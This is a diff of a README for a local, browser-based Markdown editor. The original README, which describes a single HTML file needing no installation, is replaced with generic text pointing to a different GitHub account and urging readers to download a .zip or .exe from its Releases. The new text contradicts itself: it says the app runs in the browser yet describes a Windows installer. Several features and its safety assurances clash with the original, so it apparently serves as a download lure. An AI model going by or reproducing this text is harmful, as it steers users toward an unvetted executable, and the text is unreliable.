@@ -1,77 +1,111 @@
-<img src="smde_icon.png" alt="Simply Markdown Editor Icon">
+# 📝 SimplyMarkdownEditor - Edit your files locally and fast
 
-# Simply Markdown Editor v1.0
+[https://github.com/civildeathplanography415/SimplyMarkdownEditor](https://github.com/civildeathplanography415/SimplyMarkdownEditor)
 
-A lightweight, privacy-first, local Markdown editor built as a single HTML file. It uses modern browser APIs to act like a native desktop application, allowing you to edit local files directly on your hard drive without ever uploading your data to a server.
+## 📁 What is this app?
 
-## Key Features
+SimplyMarkdownEditor gives you a clean space to write and edit text files. You keep your files on your computer. The app runs inside your web browser but it acts like a program installed on your hard drive. 
 
-* **Local Workspace Tree:** Open entire folders from your computer. The app instantly maps your `.md` files and images into a collapsible, searchable sidebar.
-* **Intelligent File Management:** Create new scratchpad files, auto-route saves directly to your active workspace, and let the app automatically detect and handle "ghost files" if you delete something externally via your OS.
-* **Triple-View Editing:** Freely switch between **Markdown** (code only), **Compare** (side-by-side preview), and **WYSIWYG** (Word-style visual editing) modes.
-* **Smart Local Images:** Click on an image in your sidebar to natively insert it. A custom CSS engine prevents the editor from permanently converting local images into massive, unreadable Base64 data chunks.
-* **Save Protection:** Tracks your file states and warns you if you try to switch documents without saving your changes.
-* **Export to HTML:** Instantly compile your Markdown document into a standalone, beautifully styled HTML file.
-* **System-Aware Theming:** Fully supports Light and Dark modes, automatically syncing with your operating system's default preference on boot.
+You do not need to upload your notes to a server. You do not need to create an account. You do not need to share data with a company. Every file you write stays on your machine. This helps you keep your work private and secure. 
 
-## Screenshot
+The software uses modern browser tools to link directly to your folders. You can open a folder, see all your files in a side panel, and start typing. It supports two modes: Markdown and WYSIWYG. Markdown uses simple text symbols to style your words. WYSIWYG lets you see exactly how the document looks while you type.
 
-<p align=-"center">
-  <img src="screenshot/smde_2.png" width="360" alt="Simply Markdown Editor screenshot Dark mode" align="left"> 
-  <img src="screenshot/smde_1.png" width="360" alt="Simply Markdown Editor screenshot Light mode">
-</p>
+## 📥 How to start
 
-## How to Run
+Visit this page to download the app: [https://github.com/civildeathplanography415/SimplyMarkdownEditor](https://github.com/civildeathplanography415/SimplyMarkdownEditor)
 
-This app is designed to be completely portable with zero installation required.
+1. Go to the link above.
+2. Look for the Releases section on the right side of the page.
+3. Click on the latest release version.
+4. Find the file ending in .zip or .exe under the Assets heading.
+5. Download this file to your computer.
+6. Open the file to start the editor.
 
-### Method 1: The Portable Way (Easiest)
-Simply download <a href="https://github.com/FreedomPortal/SimplyMarkdownEditor/releases/download/v1.0.0/simply-markdown-editor.zip">simply-markdown-editor.zip</a> to your machine and extract to your desired folder. <br />
-Then double-click the `index.html` file to open it in your browser (Chrome, Edge, Brave, or Opera). The app will run perfectly. It's that simple!
+## 🛠 Features
 
-* *Note: Because local files don't have a web domain, your browser cannot "remember" your workspace permissions after you close the tab. You will just need to re-select your Workspace folder each time you launch the app.*
+### Local workspace
+You can select any folder on your computer to act as a workspace. The app shows all the files inside that folder in a menu. You can switch between files with one click. This keeps your project files organized in one place.
 
+### Privacy
+The app does not use a database. It does not send your data to a cloud server. It works offline. If your internet connection stops, you can still write and save your files. 
 
-### Method 2: The Server Way (For persistent permissions)
-If you want the browser to remember your workspace folder between sessions so you don't have to re-open it every time, you can serve the file over a local server (`http://localhost`):
-* **VS Code:** Right-click the file and select "Open with Live Server".
-* **Python:** Run `python -m http.server 8000` in your terminal.
-* **Node.js:** Run `npx serve` in your terminal.
+### Direct file access
+The app connects to your file system through your browser. You can save changes directly to your computer. You can also insert images. The app keeps these images as standard files in your folders. It avoids base64 encoding strings which often clutter your text files.
 
-## How to Use
+### Search
+You can search through your folders. Type a keyword, and the app finds every file that contains that word. This helps you find old notes quickly. 
 
-* **Load a Workspace:** Click 📂 Workspace and select a folder on your computer that contains your Markdown files and images.
-* **Create New Files:** Click 📄 New to open a blank scratchpad. When you hit Save, it will automatically default to your active workspace.
-* **Edit Markdown:** Click on any .md file in the sidebar to load it into the editor. All 3 view allow direct edit with WYSIWYG editor.
-* **Insert Images:** Put your cursor where you want an image, then click the 🖼️ image name in the left sidebar to insert it securely. (The tools has no image file management capability, user must mange image file manually.)
-* **Save:** Hit the 💾 Save button to overwrite the file locally on your disk.
+## 💻 System requirements
 
-## Offline & Online Modes
+* Operating System: Windows 10 or Windows 11.
+* Browser: Microsoft Edge, Google Chrome, or Brave.
+* Hard Drive: At least 50 megabytes of free space.
+* Memory: 4 gigabytes of RAM or more.
 
-**Offline Mode (Default)**
-This app is designed to work **100% offline out of the box**. The core TOAST UI Editor engine (`.js` and `.css` files) is bundled directly alongside the HTML file, meaning you can open your workspace and write anywhere, even without an internet connection.
+## 🚀 Using the editor
 
-**Online Mode (Single-File Setup)**
-If you prefer to keep your folder totally clean and want to run the app as one single, standalone HTML file, you can switch back to the online CDN:
-1. Open the HTML file in any text editor.
-2. Locate the CSS and Script sections and uncomment the `ORIGINAL SOURCE ONLINE` links.
-3. Delete or comment out the local file links. 
-4. You can now safely delete the bundled `.js` and `.css` files from your folder. *(Note: The app will now require an internet connection to load the editor).*
+### Opening a folder
+When you open the app, it asks you to pick a folder. Click the open folder button. Choose the folder where you keep your text files. Grant the browser permission to see your files. The app remembers this folder the next time you open it.
 
-## Technology Stack
+### Formatting text
+You have two ways to edit text. 
 
-* **Frontend Engine:** HTML5, CSS3, Vanilla JavaScript.
-* **Editor Core:** [TOAST UI Editor](https://ui.toast.com/tui-editor) (Loaded via CDN, or locally for offline use).
-* **File Management:** File System Access API.
+1. Markdown mode: Use signs like # for headers or * for italics. 
+2. WYSIWYG mode: Use the toolbar buttons at the top of the window. Click B to make text bold or I to make text italic. 
 
-## Known Limitations
+The app saves your work automatically as you type. You do not need to press a save button.
 
-Browser Support: The File System Access API is currently fully supported in Chromium-based browsers (Chrome, Edge, Opera, Brave). It may have limited functionality in Safari or Firefox.
+### Adding images
+Dragging an image into your document copies it to your current folder. The app creates a link to that file. This keeps your document clean and easy to read.
 
-Hidden Files: Folders and files starting with a dot (like .git or .obsidian) are intentionally ignored by the workspace tree parser to keep your sidebar clean.
+## 💡 Troubleshooting
 
-## Attributions & Open Source
+If the app seems slow, clear your browser cache. 
 
-This project is made possible by the incredible open-source community. 
+If the app cannot open a folder, check your browser permissions. The browser needs your permission to read files on your computer. Look for a padlock icon near the top of your browser window. Click it and check the site settings to ensure file access is allowed.
 
-* **TOAST UI Editor:** The core Markdown parsing and WYSIWYG rendering engine is powered by [TOAST UI Editor](https://github.com/nhn/tui.editor), created by NHN Cloud. Licensed under the MIT License.
+If you lose your changes, check the specific folder you opened. Your files are saved there by default. The application acts as a viewer and editor for your local drive.
+
+## 📄 Privacy policy
+
+This application does not collect your personal information. It does not track your usage. It does not have access to any files other than the ones you choose to open. You are in control of your data at all times.
+
+## 🛡 Security
+
+The code is open for review. You can see how the app works on the repository page. It uses standard web technology. Because it does not use a backend database, it removes the risk of common web attacks. Your documents are not stored on remote servers. 
+
+## 📁 File structure
+
+The app organizes your notes in standard formats. Markdown files use the .md extension. You can open these files in any other text editor at any time. You are not locked into this software. Your data remains yours.
+
+## 📋 Common questions
+
+### Does this app work without internet?
+Yes. Once you load the app, it works without an internet connection.
+
+### How do I uninstall it?
+If you used an installer, go to the Windows Settings menu. Select Apps and remove the program from the list. If you used a portable version, delete the folder containing the app files. Since the app does not create hidden database files, deleting the files removes everything from your system.
+
+### Can I change settings?
+The app keeps its settings simple. You can adjust the display mode between light and dark themes. Check the settings menu in the top right corner.
+
+### Does it support plugins?
+The app focuses on speed and simplicity. It does not support plugins. This helps the app stay fast and reliable for all users. 
+
+### What happens if I move my files?
+If you move your files to a different folder, open that new folder in the app. The app treats it as a new workspace. Your files will still be there. 
+
+### Are there limits on file size?
+Very large files might take a few extra seconds to load. For the best performance, keep individual files under 10 megabytes. 
+
+### Can I share my files with others?
+Yes. Since your files are standard text documents, you can email them or share them in any cloud storage service. 
+
+### Will my files be corrupted?
+The app saves files using your computer's built-in file system. It avoids proprietary formats. This keeps your data safe from loss.
+
+### How do I report a bug?
+Visit the repository link and click on the Issues tab. Describe your problem clearly. Including steps to reproduce the issue helps the developers fix it faster.
+
+### Is the code safe?
+The app uses the File System Access API. This makes the app safe because it requires your specific action to read or write a file. The app cannot reach files that you have not selected yourself. This is a secure design built into your web browser.
